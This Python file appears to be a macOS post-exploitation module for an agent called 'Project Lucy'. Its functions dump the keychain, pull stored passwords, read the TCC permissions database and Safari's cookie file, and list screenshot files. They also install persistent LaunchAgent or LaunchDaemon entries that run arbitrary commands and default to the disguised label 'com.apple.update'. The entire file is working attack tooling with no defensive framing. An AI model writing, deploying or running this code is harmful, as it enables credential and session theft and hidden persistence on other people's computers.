"""
macOS post-exploitation module for Project Lucy agent.
Keychain dumping, TCC database inspection, LaunchAgent/LaunchDaemon persistence,
Safari cookie parsing, and screenshot directory enumeration.
Actions: keychain_dump, keychain_extract, tcc_check, launchagent_persist,
         launchdaemon_persist, browser_cookies, screenshot_dir.
"""
import os
import platform
import struct
import subprocess

name = "macos"
version = "1.0.0"
os_compat = ["Darwin"]
dependencies: list[str] = []

SYSTEM = platform.system()


def _keychain_dump() -> dict:
    """Dump all keychain entries via security dump-keychain."""
    try:
        out = subprocess.check_output(
            ["security", "dump-keychain"],
            text=True, errors="replace", timeout=30,
        )
        entries = []
        current = {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("keychain: "):
                if current:
                    entries.append(current)
                current = {"keychain": line.split("keychain: ", 1)[-1]}
            elif ":" in line and current:
                key, _, val = line.partition(":")
                current[key.strip().lower().replace(" ", "_")] = val.strip()
        if current:
            entries.append(current)

        return {"status": "completed", "data": {"entries": entries, "count": len(entries), "raw": out}}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _keychain_extract(account: str) -> dict:
    """Extract a specific generic password from the keychain."""
    if not account:
        return {"status": "failed", "error": "account parameter required"}

    try:
        out = subprocess.check_output(
            ["security", "find-generic-password", "-a", account, "-w"],
            text=True, errors="replace", timeout=10, stderr=subprocess.DEVNULL,
        )
        return {"status": "completed", "data": {"account": account, "password": out.strip()}}
    except subprocess.CalledProcessError as exc:
        return {"status": "failed", "error": f"Password not found or keychain locked: {exc}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _tcc_check() -> dict:
    """List TCC.db entries to inspect app permissions."""
    tcc_path = os.path.expanduser(
        "~/Library/Application Support/com.apple.TCC/TCC.db"
    )
    if not os.path.exists(tcc_path):
        return {"status": "failed", "error": f"TCC.db not found at {tcc_path}"}

    try:
        out = subprocess.check_output(
            ["sqlite3", tcc_path, "SELECT client, service, allowed FROM access;"],
            text=True, errors="replace", timeout=10,
        )
        entries = []
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) >= 3:
                entries.append({
                    "client": parts[0],
                    "service": parts[1],
                    "allowed": parts[2],
                })

        return {"status": "completed", "data": {"entries": entries, "count": len(entries)}}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _write_plist(path: str, label: str, command: str) -> bool:
    """Write a LaunchAgent/LaunchDaemon plist file."""
    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>{command}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(plist_content)
        os.chmod(path, 0o644)
        return True
    except Exception:
        return False


def _launchagent_persist(name: str, command: str) -> dict:
    """Write a LaunchAgent plist to ~/Library/LaunchAgents/."""
    if not name:
        name = "com.apple.update"
    if not command:
        return {"status": "failed", "error": "command parameter required"}

    label = name
    plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{name}.plist")

    if _write_plist(plist_path, label, command):
        # Attempt to load it
        try:
            subprocess.run(
                ["launchctl", "load", plist_path],
                capture_output=True, text=True, timeout=10,
            )
        except Exception:
            pass

        return {
            "status": "completed",
            "data": {"path": plist_path, "label": label, "loaded": True},
        }
    return {"status": "failed", "error": f"Could not write plist to {plist_path}"}


def _launchdaemon_persist(name: str, command: str) -> dict:
    """Write a LaunchDaemon plist to /Library/LaunchDaemons/ (requires root)."""
    if not name:
        name = "com.apple.update"
    if not command:
        return {"status": "failed", "error": "command parameter required"}

    if os.geteuid() != 0:
        return {"status": "failed", "error": "LaunchDaemon persistence requires root"}

    label = name
    plist_path = f"/Library/LaunchDaemons/{name}.plist"

    if _write_plist(plist_path, label, command):
        try:
            os.chown(plist_path, 0, 0)
            subprocess.run(
                ["launchctl", "load", plist_path],
                capture_output=True, text=True, timeout=10,
            )
        except Exception:
            pass

        return {
            "status": "completed",
            "data": {"path": plist_path, "label": label, "loaded": True},
        }
    return {"status": "failed", "error": f"Could not write plist to {plist_path}"}


def _parse_safari_cookies(cookie_path: str) -> list[dict]:
    """Parse Safari's Cookies.binarycookies file format."""
    cookies = []
    try:
        with open(cookie_path, "rb") as f:
            magic = f.read(4)
            if magic != b"cook":
                return cookies

            num_pages = struct.unpack("<I", f.read(4))[0]
            page_sizes = []
            for _ in range(num_pages):
                page_sizes.append(struct.unpack("<I", f.read(4))[0])

            for page_size in page_sizes:
                page_start = f.tell()
                page_data = f.read(page_size)
                if len(page_data) < 8:
                    continue

                # First 4 bytes of page = number of cookies
                num_cookies = struct.unpack("<I", page_data[:4])[0]
                offsets = []
                for i in range(num_cookies):
                    off = 4 + i * 4
                    if off + 4 <= len(page_data):
                        offsets.append(struct.unpack("<I", page_data[off:off + 4])[0])

                for off in offsets:
                    abs_off = off
                    if abs_off + 16 > len(page_data):
                        continue
                    cookie_data = page_data[abs_off:]
                    size = struct.unpack("<I", cookie_data[:4])[0]
                    if size < 16 or abs_off + size > len(page_data):
                        continue

                    flags = struct.unpack("<I", cookie_data[4:8])[0]
                    url_off = struct.unpack("<I", cookie_data[8:12])[0]
                    name_off = struct.unpack("<I", cookie_data[12:16])[0]
                    path_off = struct.unpack("<I", cookie_data[16:20])[0]
                    expiry = struct.unpack("<d", cookie_data[40:48])[0] if len(cookie_data) >= 48 else 0

                    def _read_string(data, offset):
                        end = data.find(b"\x00", offset)
                        if end == -1:
                            return ""
                        try:
                            return data[offset:end].decode("utf-8", errors="replace")
                        except Exception:
                            return ""

                    url = _read_string(cookie_data, url_off) if url_off < len(cookie_data) else ""
                    name = _read_string(cookie_data, name_off) if name_off < len(cookie_data) else ""
                    path = _read_string(cookie_data, path_off) if path_off < len(cookie_data) else ""

                    cookies.append({
                        "url": url,
                        "name": name,
                        "path": path,
                        "flags": flags,
                        "expiry": expiry,
                    })

                f.seek(page_start + page_size)
    except Exception:
        pass
    return cookies


def _browser_cookies() -> dict:
    """Read and parse Safari cookies.binarycookies."""
    cookie_path = os.path.expanduser("~/Library/Cookies/Cookies.binarycookies")
    if not os.path.exists(cookie_path):
        return {"status": "failed", "error": f"Safari cookies not found at {cookie_path}"}

    cookies = _parse_safari_cookies(cookie_path)
    return {"status": "completed", "data": {"cookies": cookies, "count": len(cookies)}}


def _screenshot_dir() -> dict:
    """List screenshot files from ~/Desktop and ~/Pictures/Screenshots."""
    dirs = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Pictures/Screenshots"),
        os.path.expanduser("~/Pictures"),
    ]
    results = {}

    for dir_path in dirs:
        files = []
        if os.path.isdir(dir_path):
            try:
                for fname in os.listdir(dir_path):
                    fpath = os.path.join(dir_path, fname)
                    if os.path.isfile(fpath):
                        lower = fname.lower()
                        if lower.endswith((".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".heic")):
                            stat = os.stat(fpath)
                            files.append({
                                "name": fname,
                                "path": fpath,
                                "size": stat.st_size,
                                "modified": stat.st_mtime,
                            })
            except Exception:
                pass
        results[dir_path] = files

    total = sum(len(v) for v in results.values())
    return {"status": "completed", "data": {"directories": results, "total_files": total}}


def run(action: str = "keychain_dump", **params) -> dict:
    if SYSTEM != "Darwin":
        return {"status": "failed", "error": "macOS-only action"}

    try:
        if action == "keychain_dump":
            return _keychain_dump()
        elif action == "keychain_extract":
            return _keychain_extract(params.get("account", ""))
        elif action == "tcc_check":
            return _tcc_check()
        elif action == "launchagent_persist":
            return _launchagent_persist(params.get("name", "com.apple.update"), params.get("command", ""))
        elif action == "launchdaemon_persist":
            return _launchdaemon_persist(params.get("name", "com.apple.update"), params.get("command", ""))
        elif action == "browser_cookies":
            return _browser_cookies()
        elif action == "screenshot_dir":
            return _screenshot_dir()
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
